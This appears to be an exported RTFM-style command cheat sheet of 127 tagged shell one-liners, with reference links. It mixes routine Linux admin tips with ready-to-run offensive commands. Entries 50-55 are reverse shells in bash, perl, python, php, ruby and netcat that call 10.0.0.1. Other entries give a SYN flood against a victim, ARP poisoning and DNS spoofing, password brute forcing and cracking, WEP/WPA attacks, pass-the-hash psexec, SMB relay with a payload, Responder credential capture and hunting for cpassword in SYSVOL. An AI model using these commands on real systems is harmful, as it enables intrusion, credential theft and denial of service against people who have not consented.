### 1. Helpception, search for a command with two tags and a comment
```
rtfm.py -c [command] -t [tag1],[tag2] -R [comment] -r [reference] -a [Author] -A [Date|Now]  -p P
```
**- linux**
#### References:

https://github.com/leostat/rtfm
https://necurity.co.uk/osprog/2017-02-27-RTFM-Pythonized/index.html
__________
### 2. Use only the lines that match a given RegEX [TERM]
```
awk /^[TERM]/ '{print "See the",$1,"at the",$3}' words.txt
```
**- linux,bash,text manipulation**
#### References:

http://www.thegeekstuff.com/2010/01/awk-introduction-tutorial-7-awk-print-examples
https://www.cyberciti.biz/faq/bash-scripting-using-awk/
__________
### 3. Calculations using AWK. AWK is a huge language, not just for printing columns
```
awk '{print "Avg for",$1,"is",($2+$3+$4)/3}' grades.txt
```
**- linux,bash,text manipulation**
#### References:

http://www.thegeekstuff.com/2010/01/awk-introduction-tutorial-7-awk-print-examples
https://www.cyberciti.biz/faq/bash-scripting-using-awk/
__________
### 4. Print first and last lines of a file
```
awk 'NR==1;END{print}' file.txt
```
**- linux,bash,text manipulation**
#### References:

http://www.thegeekstuff.com/2010/01/awk-introduction-tutorial-7-awk-print-examples
https://www.cyberciti.biz/faq/bash-scripting-using-awk/
__________
### 5. Split the file on ; instead of space
```
awk -F ";" '{print $2}' file.txt
```
**- linux,bash,text manipulation**
#### References:

http://www.thegeekstuff.com/2010/01/awk-introduction-tutorial-7-awk-print-examples
https://www.cyberciti.biz/faq/bash-scripting-using-awk/
__________
### 6. Print a portion of the text
```
awk '/start_pattern/,/stop_pattern/' file.txt
```
**- linux,bash,text manipulation**
#### References:

http://www.thegeekstuff.com/2010/01/awk-introduction-tutorial-7-awk-print-examples
https://www.cyberciti.biz/faq/bash-scripting-using-awk/
__________
### 7. diff file in cvs
```
cvs diff <file>
```
**- linux,bash**
#### References:

http://tulrich.com/geekstuff/cvs.html
__________
### 8. show history of files
```
cvs log <file>
```
**- linux,bash**
#### References:

http://tulrich.com/geekstuff/cvs.html
__________
### 9. roll back cvs change
```
file=cvs.txt; cvs update -r $(cvs log $file | grep ^revision | sed -n 2p | awk '{print $NF}') $file && mv $file{,.old} && cvs update -A $file && mv $file.old $file && cvs commit -m "Reverted to previous version" $file
```
**- linux,bash,loop**
#### References:

http://tulrich.com/geekstuff/cvs.html
__________
### 10. find broken symlinks
```
find -L . -type l
```
**- linux,bash**
#### References:

https://www.cyberciti.biz/faq/linux-unix-find-files-with-symbolic-links/
__________
### 11. List services started on boot
```
chkconfig --list
```
**- linux**
#### References:

https://access.redhat.com/documentation/en-US/Red_Hat_Enterprise_Linux/6/html/Deployment_Guide/s2-services-chkconfig.html
__________
### 12. Hijack screen
```
screen -D -R [ID]
```
**- linux,bash**
#### References:

https://www.cyberciti.biz/tips/linux-screen-command-howto.html
__________
### 13. Forward the remote port to the local machine
```
ssh -R [lport]:[rip]:[rport] [ip] -N
```
**- linux,bash,networking,pivoting**
#### References:

http://unix.stackexchange.com/questions/115897/whats-ssh-port-forwarding-and-whats-the-difference-between-ssh-local-and-remot
https://www.cyberciti.biz/faq/set-up-ssh-tunneling-on-a-linux-unix-bsd-server-to-bypass-nat/
__________
### 14. Forward the local port to the remote machine
```
ssh -L [lport]:[rip]:[rport] [ip] -N
```
**- linux,bash,networking,pivoting**
#### References:

http://unix.stackexchange.com/questions/115897/whats-ssh-port-forwarding-and-whats-the-difference-between-ssh-local-and-remot
https://www.cyberciti.biz/faq/set-up-ssh-tunneling-on-a-linux-unix-bsd-server-to-bypass-nat/
__________
### 15. 1Gig of zeros
```
dd if=/dev/zero of=1g.img count=1M bs=1K
```
**- linux,bash,files**
#### References:

https://www.cyberciti.biz/faq/linux-unix-dd-command-show-progress-while-coping/
__________
### 16. get password policy for root
```
chage -l root
```
**- linux,bash,passwords,enumeration,user information**
#### References:

http://www.thegeekstuff.com/2009/04/chage-linux-password-expiration-and-aging/
__________
### 17. Display system clock in terminal top right corner! :-)
```
while sleep 1;do tput sc;tput cup 0 $(($(tput cols)-29));date;tput rc;done &
```
**- linux,bash,loop,interesting**
#### References:

http://www.computerhope.com/unix/utput.htm
__________
### 18. display disk info
```
smartctl -d megaraid,0 -x /dev/sda
```
**- linux**
#### References:

https://www.cyberciti.biz/tips/linux-find-out-if-harddisk-failing.html
__________
### 19. icmp ping
```
hping3 -1 [ip]
```
**- linux,bash,networking**
#### References:

http://wiki.hping.org/
__________
### 20. syn scan port range with hping
```
hping3 -8 [port]-[port] -S [ip] -V
```
**- linux,bash,networking,scanning**
#### References:

http://wiki.hping.org/
__________
### 21. ACK scan on port
```
hping3 -A [ip] -p [port]
```
**- linux,bash,networking,scanning**
#### References:

http://wiki.hping.org/
__________
### 22. udp port scan
```
hping3 -2 [ip] -p [port ]
```
**- linux,bash,networking**
#### References:

http://wiki.hping.org/
https://www.cyberciti.biz/tips/howto-linux-iptables-bypass-firewall-restriction.html
__________
### 23. Get initial sequence number
```
hping3 -Q [ip] -p [port] -s
```
**- linux,bash,networking**
#### References:

http://wiki.hping.org/
__________
### 24. get remote timestamp
```
hping3 -S [ip] -p [port] --tcp-timestamp
```
**- linux,bash,networking,enumeration**
#### References:

http://wiki.hping.org/
__________
### 25. Xmas' scan
```
hping3 -F -p -U [ip] -p [port]
```
**- linux,bash,networking,scanning**
#### References:

http://wiki.hping.org/
__________
### 26. Sweep range for up hosts ie 192.168.1.x
```
hping3 -1 [ip].x --rand-dest -I em1
```
**- linux,bash,networking**
#### References:

http://wiki.hping.org/
__________
### 27. Intercept all http
```
hping3 -9 HTTP -I em1
```
**- linux,bash,networking**
#### References:

http://wiki.hping.org/
__________
### 28. Syn flood victim
```
hping3 -S [victim] -a [gw] -p [port] --flood
```
**- linux,bash,networking,interesting**
#### References:

http://wiki.hping.org/
__________
### 29. get google
```
GET //google.com
```
**- linux,bash**
#### References:

https://www.lifewire.com/get-linux-command-4093526
__________
### 30. Brute HTTP with hydra -s 443 for ssl
```
hydra -L [usernames] -P [passwords] -t 1 -e ns -f -vV <destination> http-get /
```
**- linux,brute,http**
#### References:

https://www.aldeid.com/wiki/Thc-hydra#Usage
__________
### 31. bash if
```
if [ $carprice -gt 20000]; then echo "too much"; else echo "ok"; fi
```
**- linux,bash**
#### References:

http://www.thegeekstuff.com/2010/06/bash-conditional-expression
https://bash.cyberciti.biz/guide/If..else..fi
__________
### 32. # Verify the certificate / private key association
```
openssl x509 -noout -modulus -in [CERT] | openssl md5
```
**- linux,bash,certificates**
#### References:

https://www.sslshopper.com/article-most-common-openssl-commands.html
__________
### 33. https://www.sslshopper.com/article-most-common-openssl-commands.html
```
openssl x509 -in certificate.crt -text
```
**- linux,bash,certificates**
#### References:

https://www.sslshopper.com/article-most-common-openssl-commands.html
__________
### 34. Grab the hostname in the certificate
```
echo "" | openssl s_client -connect [ip]:443 2>/dev/null| grep ^subject | sed 's/^.*CN=//'
```
**- linux,bash,certificates**
#### References:

https://www.sslshopper.com/article-most-common-openssl-commands.html
__________
### 35. Change MAC address
```
ifconfig eth0 hw ether 00:E0:81:5C:B4:0F
```
**- linux,bash,networking,stealth**
#### References:

https://www.cyberciti.biz/faq/linux-change-ip-address/
__________
### 36. How will the sytem route traffic to [IP]
```
ip route show to match [IP]
```
**- linux,bash,networking**
#### References:

http://baturin.org/docs/iproute2/
__________
### 37. Depricated way of showing routing table, please see the ip command
```
route -n
```
**- linux,bash,networking**
#### References:

http://baturin.org/docs/iproute2/
__________
### 38. Curl through a proxy (-m = timeout)
```
curl -D - --proxy1.0 [ip]:80 -m 2 [url]
```
**- linux,bash,web application**
#### References:

http://www.thegeekstuff.com/2012/04/curl-examples/
__________
### 39. Curl with cookie
```
curl -k --cookie "[cookie]" [url] --silent | grep "<title>"
```
**- linux,bash,web application**
#### References:

http://www.thegeekstuff.com/2012/04/curl-examples/
__________
### 40. Null session smb
```
smbclient -I [IP] -L [domain] -N -U ""
```
**- linux,bash,smb**
#### References:

https://www.cyberciti.biz/faq/access-windows-shares-from-linux/
https://www.samba.org/samba/docs/man/manpages-3/smbclient.1.html
__________
### 41. Default community string in SNMP
```
snmpwalk -v 1 -c public [TARGET]
```
**- linux,bash,scanning,brute**
#### References:

http://net-snmp.sourceforge.net/docs/man/snmpwalk.html
__________
### 42. Ettercap arp poisoning
```
ettercap -M arp -T -i em1 -L log /[TARGET]//
```
**- linux,networking,MitM**
#### References:

https://ettercap.github.io/ettercap/
__________
### 43. Fierce (v0.9) - DNS bruteforcer
```
fierce -threads 10 -dns [domain] -wordlist [wordlist] -dnsserver 8.8.8.8 -file fierce.txt
```
**- linux,networking,scanning,dns**
#### References:

https://github.com/mschwager/fierce
ha.ckers.org/fierce/
__________
### 44. recover file after being deleted
```
lsof 2>/dev/null | grep deleted;  cat /proc/24702/fd/4
```
**- linux,bash,interesting**
#### References:

https://www.cyberciti.biz/tips/linux-ext3-ext4-deleted-files-recovery-howto.html
__________
### 45. list installed programs
```
rpm -qa | less
```
**- linux,bash,package management**
#### References:

https://www.linux.com/blog/rpm-commands
__________
### 46. remove 4 chars
```
echo "hello fredrick" | sed 's/.\{4\}$//'
```
**- linux,bash,text manipulation**
#### References:

http://www.grymoire.com/Unix/Sed.html
http://www.thegeekstuff.com/tag/sed-examples/
https://www.cyberciti.biz/faq/tag/sed-command/
__________
### 47. add space after each line
```
cat db.schema | sed G
```
**- linux,bash,text manipulation**
#### References:

http://www.grymoire.com/Unix/Sed.html
http://www.thegeekstuff.com/tag/sed-examples/
https://www.cyberciti.biz/faq/tag/sed-command/
__________
### 48. convert a list into a multi line CSV
```
sed 's/ *$//;s/$/;/' linkedin.txt | paste - - - - | tr -d '\t'
```
**- linux,bash,text manipulation**
#### References:

http://www.grymoire.com/Unix/Sed.html
http://www.thegeekstuff.com/tag/sed-examples/
https://www.cyberciti.biz/faq/tag/sed-command/
__________
### 49. # Add to the beginning of the line starting with a pattern
```
sed -i '/^[0-9]/ s/^/sshd: /' /etc/hosts.allow
```
**- linux,bash,text manipulation**
#### References:

http://www.grymoire.com/Unix/Sed.html
http://www.thegeekstuff.com/tag/sed-examples/
https://www.cyberciti.biz/faq/tag/sed-command/
__________
### 50. bash reverse shell
```
bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
```
**- linux,bash,reverse shells**
#### References:

https://highon.coffee/blog/reverse-shell-cheat-sheet/
__________
### 51. perl reverse shell
```
perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```
**- linux,reverse shells,Windows,perl**
#### References:

https://highon.coffee/blog/reverse-shell-cheat-sheet/
__________
### 52. python reverse shell
```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```
**- linux,reverse shells,Windows,python**
#### References:

https://highon.coffee/blog/reverse-shell-cheat-sheet/
__________
### 53. php reverse shell : php from the CLI
```
php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
```
**- linux,reverse shells,Windows,php**
#### References:

https://highon.coffee/blog/reverse-shell-cheat-sheet/
__________
### 54. ruby reverse shell
```
ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```
**- linux,reverse shells,Windows,ruby**
#### References:

https://highon.coffee/blog/reverse-shell-cheat-sheet/
__________
### 55. net cat reverse shell
```
nc -e /bin/sh 10.0.0.1 1234
```
**- linux,reverse shells,Windows**
#### References:

https://highon.coffee/blog/reverse-shell-cheat-sheet/
__________
### 56. not ls
```
sl
```
**- linux,bash,interesting**
#### References:

https://www.cyberciti.biz/tips/displays-animations-when-accidentally-you-type-sl-instead-of-ls.html
__________
### 57. Abuse open x11 : Think open term add user add key ;)
```
command="[cmd]";echo -n xdotool key " "; echo -n $command| sed  's# #€#g' | sed -e 's/\(.\)/\1 /g' | sed 's#/#slash#g' | sed 's#@#at#g'|  sed 's#€#space#g' | sed 's#-#minus#g'|sed 's#>#greater#g'| sed 's#+#plus#g' | sed 's#"#quotedbl#g' | sed 's#~#asciitilde#g' | sed 's#\.#period#g' | sed 's#_#underscore#g'; echo KP_Enter
```
**- linux,bash,interesting**
#### References:

https://necurity.co.uk
https://ubuntuforums.org/archive/index.php/t-1970619.html
__________
### 58. WIFI enable USB2 before USB3 : helps with passthrough
```
echo 1 > /sys/module/usbcore/parameters/old_scheme_first
```
**- linux,wireless,wifi,configuration**
#### References:

http://forums.fedoraforum.org/archive/index.php/t-30868.html
__________
### 59. WIFI : Enable monitor mode on interface
```
ifconfig wlan0 down; iwconfig wlan0 mode monitor; ifconfig wlan0 up;
```
**- linux,networking,wireless,wifi**
#### References:

https://www.aircrack-ng.org/doku.php?id=airodump-ng
__________
### 60. loop to find user shares
```
for host in $(cat ../nmap/[IP File]); do echo "Trying $host"; smbclient -L $host -U  [DOM]/[USER]%'[PASS]'; done
```
**- linux,bash,loop,enumeration,smb**
#### References:

https://www.samba.org/samba/docs/man/manpages-3/smbclient.1.html
https://yg.ht
__________
### 61. kill puppies, you monster (disable SElinux, though seriously just work around it)
```
setenforce permissive
```
**- linux**
#### References:

https://stopdisablingselinux.com/
__________
### 62. Mount Sysvol share (hosted on the DC)
```
mount -t cifs \\\\[victim]\\SYSVOL -o username=[user],password=[password] mount/; nautilus mount/;
```
**- linux,files,smb,filesystem**
#### References:

https://www.cyberciti.biz/faq/linux-mount-cifs-windows-share/
__________
### 63. Look in 'mount' for share (mount sysvol first)
```
egrep -r "cpassword|net" mount
```
**- linux,enumeration,smb**
#### References:

https://blogs.technet.microsoft.com/ash/2014/11/10/dont-set-or-save-passwords-using-group-policy-preferences/
__________
### 64. loop to find local admins
```
for i in `cat smb_up `; do timeout 10 psexec.py [user]:[pass]@$i net localgroup administrators; done | tee local_admin_information
```
**- linux,loop,enumeration,user information,impacket**
#### References:

https://technet.microsoft.com/en-us/library/bb490706.aspx
__________
### 65. turn loop for local admins into csv
```
egrep -v "(\*\] T|\[\*\] F|[\*\] C|[\*\] U|[\*\] S|[\*\] R)" local_admin_information | egrep -v "(\[\*\] P|\[\*\] R|\[\*\] S|\[\*\] O|\[\*\] U)" | grep -v "Alias name" | grep -v "Administrators have complete" | grep -v \[\!\] | grep -v \[-\] | dos2unix | grep -v "^$" | sed s/"\[\*\] Creating service.*on"/''/g | grep -v Members | sed s/\\.\\.\\.\\.\\./','/g | sed s/"^ "/"€"/g | sed s/'The command completed successfully.'/€/g | tr "\n" "," | tr € "\n" | grep -v "^$" | sort | uniq  > local_admins.csv
```
**- linux,bash,text manipulation,loop,user information,interesting**
#### References:

http://tldp.org/HOWTO/Bash-Prog-Intro-HOWTO.html
__________
### 66. connect to mssql
```
tsql -S [IP] -U sa -P"[PASS]"
```
**- linux,mssql**
#### References:

https://linux.die.net/man/1/tsql
__________
### 67. connect to mssql
```
/opt/impacket/examples/mssqlclient.py [user]:[pass]@[ip] -port [port]
```
**- linux,mssql,impacket**
#### References:

https://www.coresecurity.com/corelabs-research/open-source-tools/impacket
__________
### 68. Scheduled cmd to run
```
at [TIME] command.exe /s cmd SYSCMD
```
**- linux,bash,Windows**
#### References:

https://technet.microsoft.com/en-gb/library/bb490866.aspx
https://www.lifewire.com/linux-command-at-4091646
__________
### 69. loop around and open cmd, Psexecy.py != psexec msf != sysinternals psexec
```
for host in $(cat hosts.txt); do psexec.py [DOM]/[USER]:'[PASS]'@$host "cmd.exe"; done
```
**- linux,loop,impacket,remote command shell**
#### References:

https://yg.ht
https://www.coresecurity.com/corelabs-research/open-source-tools/impacket
__________
### 70. PSExec with hashses
```
psexec.py -hashes [LM]:[NTLM] [DOM]/[USER]@[TARGET] "cmd.exe"
```
**- linux,impacket,remote command shell,hashes**
#### References:

https://www.coresecurity.com/corelabs-research/open-source-tools/impacket
__________
### 71. RPCClient smb show users and groups
```
rpcclient -U '[DOMAIN]\[USER]'%'[PASS]' '[TARGET]' -c enumdomusers,enumdomgroups
```
**- linux,enumeration,user information,smb**
#### References:

https://www.samba.org/samba/docs/man/manpages/rpcclient.1.html
__________
### 72. Create Self-signed cert / key
```
name=sslfile;openssl genrsa -out $name.key 2048;openssl req -new -key $name.key -out $name.csr; openssl x509 -req -days 10 -in $name.csr -signkey $name.key -out $name.crt;openssl pkcs12 -export -clcerts -in $name.crt -inkey $name.key -out $name.p12;openssl pkcs12 -in $name.p12 -out $name.pem -clcerts
```
**- linux,bash,certificates**
#### References:

https://yg.ht
https://www.sslshopper.com/article-how-to-create-a-self-signed-certificate.html
__________
### 73. harvester
```
/data/hacking/theHarvester/theHarvester.py -h -d [domain] -l 1000 -b all | tee harvester-search-[DETAIL].txt
```
**- linux,user information,scanning,recon**
#### References:

https://yg.ht
http://www.edge-security.com/theharvester.php
__________
### 74. harvester linkedin
```
/data/hacking/theHarvester/theHarvester.py -d [domain] -l 1000 -b linkedin | tee harvester-people-[DETAIL].txt
```
**- linux,user information,scanning,recon**
#### References:

https://yg.ht
http://www.edge-security.com/theharvester.php
__________
### 75. KeePass2 Cracking
```
wine KeeCracker.exe -w /data/hacking/dictionaries/rockyou.dic -t 4 Database.kdbx
```
**- linux,passwords,Windows,cracking**
#### References:

https://yg.ht
http://www.cervezhack.fr/2013/02/12/bruteforce-a-keepass-file/?lang=en
__________
### 76. Find files
```
find / -iname '[SEARCH TERM]' 2>/dev/null
```
**- linux,files**
#### References:

https://yg.ht
http://www.thegeekstuff.com/2009/03/15-practical-linux-find-command-examples
https://www.cyberciti.biz/tips/linux-findinglocating-files-with-find-command-part-1.html
__________
### 77. 'Telnet' s_client to SSL
```
openssl s_client -connect [domain]:443
```
**- linux,certificates**
#### References:

https://yg.ht
https://www.feistyduck.com/library/openssl-cookbook/online/ch-testing-with-openssl.html
__________
### 78. IKE Agressive
```
ike-scan -A -v -id=test -f [input file] -P[PSK output file]
```
**- linux,scanning**
#### References:

https://github.com/royhills/ike-scan
http://carnal0wnage.attackresearch.com/2011/12/aggressive-mode-vpn-ike-scan-psk-crack.html
__________
### 79. IKE Agressive
```
psk-crack -d [word list e.g. rockyou.txt] [input key file]
```
**- linux,cracking**
#### References:

http://carnal0wnage.attackresearch.com/2011/12/aggressive-mode-vpn-ike-scan-psk-crack.html
__________
### 80. ARP Spoofing filter
```
etterfilter *.filter -o smb.ef
```
**- linux,networking,MitM**
#### References:

https://ettercap.github.io/ettercap/
http://www.thegeekstuff.com/2012/05/ettercap-tutorial
__________
### 81. ARP Spoofing gateway
```
ettercap -i em1 -L etter.log -T -M arp:remote /192.168.104.254/// ////
```
**- linux,networking,MitM**
#### References:

https://ettercap.github.io/ettercap/
https://yg.ht
http://www.thegeekstuff.com/2012/05/ettercap-tutorial
__________
### 82. ARP Spoofing everything
```
ettercap -i wlan0 -L etter.log -T -M arp:remote -L [CLIENT+TARGET].log /[GW IP]// /[TARGET IP]//
```
**- linux,networking,MitM,wifi**
#### References:

https://ettercap.github.io/ettercap/
https://yg.ht
http://www.thegeekstuff.com/2012/05/ettercap-tutorial
__________
### 83. ARP Spoofing DNS
```
ettercap -i [interface] -L etter.log -T -P dns_spoof -M arp:remote -L [CLIENT+TARGET].log /[GW IP]// /[TARGET IP]//
```
**- linux,networking,MitM,wifi**
#### References:

https://ettercap.github.io/ettercap/
https://yg.ht
http://www.thegeekstuff.com/2012/05/ettercap-tutorial
__________
### 84. ARPing
```
arping -I em1 [TARGET IP]
```
**- linux,networking,scanning**
#### References:

https://www.cyberciti.biz/faq/linux-duplicate-address-detection-with-arping/
__________
### 85. ARPing sweep network
```
for a in {0..254}; do arping -D -c 1 -I eth0 [NETWORK].$a; done | tee arping-[NET].txt
```
**- linux,networking,loop,scanning**
#### References:

https://yg.ht
https://www.cyberciti.biz/faq/linux-duplicate-address-detection-with-arping/
__________
### 86. Temporary IP
```
ifconfig eth0 192.168.0.x/24
```
**- linux,bash,networking,stealth**
#### References:

https://www.cyberciti.biz/faq/linux-change-ip-address/
__________
### 87. Wireless survey WIFI
```
airmon-ng start wlan1
```
**- linux,wireless,wifi**
#### References:

http://www.aircrack-ng.org/doku.php?id=airmon-ng
__________
### 88. Wireless survey WIFI, useful if airmon start is broke
```
ifconfig wlan0 down; iwconfig wlan0 mode monitor; ifup wlan0
```
**- linux,networking,wireless,wifi**
#### References:

http://www.aircrack-ng.org/doku.php?id=airmon-ng
__________
### 89. WIFI WPA handshake capture
```
airodump-ng -c [Channel #] --bssid [MAC Address] --showack -w [SSID] wlan1mon
```
**- linux,networking,wireless,wifi,packet capture**
#### References:

https://www.aircrack-ng.org/doku.php?id=cracking_wpa
__________
### 90. WIFI WPA handshake prep
```
wpaclean [OUTPUT] [INPUT]
```
**- linux,wireless,wifi,cracking**
#### References:

https://www.aircrack-ng.org/doku.php?id=cracking_wpa
__________
### 91. WIFI WPA handshake prep
```
aircrack-ng [INPUT.cap] -J [OUTPUT]
```
**- linux,wireless,wifi,cracking**
#### References:

https://www.aircrack-ng.org/doku.php?id=cracking_wpa
__________
### 92. wep crack : 1) start capturing IV's
```
airodump-ng -c 11 --bssid [VICTIM MAC] -w [OUTPUT] mon0
```
**- linux,wireless,wifi,cracking**
#### References:

https://www.aircrack-ng.org/doku.php?id=simple_wep_crack
__________
### 93. wep crack 2) De auth clients
```
aireplay-ng -0 0 --ignore-negative-one -e [SSID] -a [AP MAC] -c [VICTIM MAC] mon0
```
**- linux,wireless,wifi,cracking**
#### References:

https://www.aircrack-ng.org/doku.php?id=simple_wep_crack
__________
### 94. wep crack 3) Create a fake auth to the AP
```
aireplay-ng -1 0 -e [VICTIM SSID] -a [VICTIM MAC] -h [OurMac] wlan0
```
**- linux,networking,wireless,wifi,cracking**
#### References:

https://www.aircrack-ng.org/doku.php?id=simple_wep_crack
__________
### 95. wep cracking
```
aireplay-ng -3 -b [VICTIM MAC] -h [OurMac] wlan0
```
**- linux,wireless,wifi,cracking**
#### References:

https://www.aircrack-ng.org/doku.php?id=simple_wep_crack
__________
### 96. wep cracking
```
aircrack-ng -b [VICTIM MAC] [OUTPUT]*cap
```
**- linux,wireless,wifi,cracking**
#### References:

https://www.aircrack-ng.org/doku.php?id=simple_wep_crack
__________
### 97. Block outbound rule
```
iptables -I OUTPUT -d [DST IP] -j DROP
```
**- linux,networking**
#### References:

http://www.linuxhomenetworking.com/wiki/index.php/Quick_HOWTO_:_Ch14_:_Linux_Firewalls_Using_iptables#.WKhF2TuLREY
__________
### 98. Accept inbound port rule
```
iptables -I INPUT -p tcp --destination-port [PORT] -j ACCEPT
```
**- linux,networking**
#### References:

http://www.linuxhomenetworking.com/wiki/index.php/Quick_HOWTO_:_Ch14_:_Linux_Firewalls_Using_iptables#.WKhF2TuLREY
__________
### 99. medusa brute force
```
medusa -M ssh -U userlist -P passwordlist -h [host]
```
**- linux,brute**
#### References:

http://foofus.net/goons/jmk/medusa/medusa.html
__________
### 100. Word list generator
```
./mp64.bin -o custom.dic -1 tT -2 eE3 -3 ?s ?1qq?2qqq?2?2qq?2?3?3
```
**- linux,passwords,Windows,cracking**
#### References:

https://hashcat.net/wiki/doku.php?id=maskprocessor
__________
### 101. Word list generator
```
/data/hacking/hashcat-0.49/hashcat-cli64.bin -m 99999 wordseed.dic -r /data/hacking/hashcat-0.49/rules/leetspeak.rule --stdout | sort -u > custom.dic
```
**- linux,Windows,cracking**
#### References:

https://yg.ht
https://hashcat.net/wiki/doku.php?id=maskprocessor
__________
### 102. brute force ncrack vnc
```
ncrack -v -d1 -T5 -P /usr/share/wordlists/rockyou.txt [service eg vnc]://[target IP]:[port eg 5900] -oA [output file]-ncrack.txt
```
**- linux,brute**
#### References:

https://hackertarget.com/brute-forcing-passwords-with-ncrack-hydra-and-medusa/
__________
### 103. DNS zone transfer
```
dig -t AXFR [FQDN] @[SERVER IP]
```
**- linux,networking,dns**
#### References:

http://www.thegeekstuff.com/2012/02/dig-command-examples
__________
### 104. NBTScan
```
nbtscan -v -s : 192.168.0.0/24 >> nbtscan-[SUBNET].txt
```
**- linux,scanning,smb**
#### References:

https://yg.ht
http://unixwiz.net/tools/nbtscan.html
__________
### 105. NBTScan en masse
```
for a in {0..254}; do nbtscan -v -s : 192.168.$a.0/24 >> nbtscan-192.168.$a.txt; done
```
**- linux,loop,scanning,smb**
#### References:

https://yg.ht
http://unixwiz.net/tools/nbtscan.html
__________
### 106. network discovery RDNS
```
nmap -sS -n -v -T5 -iL networks-sorted.txt -oA nmapScan-ARP
```
**- linux,networking,scanning**
#### References:

https://nmap.org/book/man-examples.html
https://highon.coffee/blog/nmap-cheat-sheet/
https://www.cyberciti.biz/networking/nmap-command-examples-tutorials/
__________
### 107. network discovery RDNS
```
cat nmapScan-ARP.gnmap | grep "Status: Up" | awk {'print $2'} | awk -F "." {'print $1"."$2"."$3".0/24"'} | sort -u > networks-withlivehosts.txt
```
**- linux,networking,scanning**
#### References:

https://yg.ht
http://tldp.org/HOWTO/Bash-Prog-Intro-HOWTO.html
__________
### 108. smbrelay targeted
```
smbrelayx.py -h [TARGETIP] -e [PAYLOAD exe]
```
**- linux,smb,MitM,Windows,impacket,privilege escalation**
#### References:

https://www.coresecurity.com/corelabs-research/open-source-tools/impacket
__________
### 109. smbrelay reflection : note read into http -> smb refelction
```
smbrelayx.py -e [PAYLOAD exe]
```
**- linux,smb,MitM,Windows,impacket,privilege escalation**
#### References:

https://www.coresecurity.com/corelabs-research/open-source-tools/impacket
__________
### 110. responder NBNS LLMNR
```
/data/hacking/Responder/Responder.py -I eth0 -wrfFd --lm -i [YOUR IP]
```
**- linux,passwords,smb,MitM,privilege escalation**
#### References:

https://github.com/SpiderLabs/Responder
https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/
__________
### 111. List smb shares on a target host domain and pass are optional, % seperates user from pass
```
smbclient -L [TARGET] -U [DOM]/[USER]%'[PASS]'
```
**- linux,enumeration,smb**
#### References:

https://www.samba.org/samba/docs/man/manpages-3/smbclient.1.html
__________
### 112. text in binaries
```
strings [FILENAME] --bytes=2 |grep "^sa$" -A 4
```
**- linux,bash,files**
#### References:

http://tldp.org/HOWTO/Bash-Prog-Intro-HOWTO.html
__________
### 113. Telnet Mail
```
telnet [IP] 25
```
**- linux,networking,Windows**
#### References:

http://www.yuki-onna.co.uk/email/smtp.html
__________
### 114. load balance detection
```
halberd -v -p 10 [URL]
```
**- linux,networking,scanning,web application**
#### References:

https://github.com/jmbr/halberd
__________
### 115. Get a listing of all users and groups for targeting your post exploitation
```
enum4linux.pl -a -u [USER] -p [PASS] [TARGET] | tee [CLIENTNAME].domainenum
```
**- linux,enumeration,user information,smb**
#### References:

https://labs.portcullis.co.uk/tools/enum4linux/
__________
### 116. Get a list of all the users in the domain from a full dump
```
cat [CLIENTNAME].domainenum | grep "^user" | cut -d ":" -f 2 | cut -d "]" -f 1 | cut -d "[" -f 2 > userlist.txt
```
**- linux,enumeration,user information,smb**
#### References:

http://tldp.org/HOWTO/Bash-Prog-Intro-HOWTO.html
__________
### 117. manual vlans
```
vconfig add em1 [VLANID]
```
**- linux,bash,networking,configuration**
#### References:

https://yg.ht
https://www.cyberciti.biz/tips/howto-configure-linux-virtual-local-area-network-vlan.html
__________
### 118. dhcp client
```
dhclient -d -v -4 -pf /tmp/dhclient.pid -lf /tmp/dhclient.lease em1
```
**- linux,bash,networking,configuration**
#### References:

https://yg.ht
https://www.cyberciti.biz/faq/tag/dhclient-command/
__________
### 119. dhcp lease rpm
```
cat `find /var/lib/NetworkManager/*ens10* -type f -mmin -360 -ls | awk {'print $11'}`
```
**- linux,bash,networking**
#### References:

https://yg.ht
https://www.cyberciti.biz/faq/tag/dhclient-command/
__________
### 120. dhcp lease deb
```
cat `find /var/lib/dhcp/dhclient*eth0* -type f -mmin -360 -ls | awk {'print $11'}`
```
**- linux,bash,networking**
#### References:

https://yg.ht
https://www.cyberciti.biz/faq/tag/dhclient-command/
__________
### 121. dhcp lease
```
ls -lt /var/lib/NetworkManager/
```
**- linux,bash,networking**
#### References:

https://www.cyberciti.biz/faq/tag/dhclient-command/
__________
### 122. route table add
```
route add -net [CIDR] gw [IP] [INTERFACE]
```
**- linux,bash,networking,configuration**
#### References:

https://yg.ht
https://www.cyberciti.biz/faq/linux-route-add/
http://www.linuxhomenetworking.com/wiki/index.php/Quick_HOWTO_:_Ch03_:_Linux_Networking
__________
### 123. route table del
```
route del -net 0.0.0.0 gw [GW] eth1
```
**- linux,bash,networking,configuration**
#### References:

https://yg.ht
https://www.cyberciti.biz/faq/linux-route-add/
http://www.linuxhomenetworking.com/wiki/index.php/Quick_HOWTO_:_Ch03_:_Linux_Networking
__________
### 124. Encrypted zip
```
7z a -p -mem=AES report.zip [INPUT FILE]
```
**- linux,bash,files**
#### References:

https://yg.ht
https://www.cyberciti.biz/tips/how-can-i-zipping-and-unzipping-files-under-linux.html
__________
### 125. hashcat cpu
```
./hashcat-cli64.bin --session=[SESSIONNAME] -m[hash ID] [input file] [dict file] --rules rules/[rule file e.g. best64.rule d3ad0ne.rule etc]
```
**- linux,Windows,cracking**
#### References:

https://hashcat.net/wiki/
__________
### 126. hashcat assuming that hc is an alias (kraken | pablo)
```
hc --gpu-temp-abort=100 --remove -m5500 netntlmv1.hash -a3 -1 '?u?l?d' '?1?1?1?1?1?1?1?1' -o hash.crack
```
**- linux,hashes,cracking**
#### References:

https://hashcat.net/wiki/
__________
### 127. cvs check out repo
```
cvs checkout [package name]
```
**- linux,bash**
#### References:

